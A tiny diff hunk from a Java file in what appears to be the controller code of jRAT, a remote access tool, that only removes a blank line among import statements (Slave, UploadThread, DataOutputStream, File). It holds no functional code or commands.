@@ -2,7 +2,6 @@ package io.jrat.controller.packets.outgoing;
 
 import io.jrat.controller.Slave;
 import io.jrat.controller.threads.UploadThread;
-
 import java.io.DataOutputStream;
 import java.io.File;
 
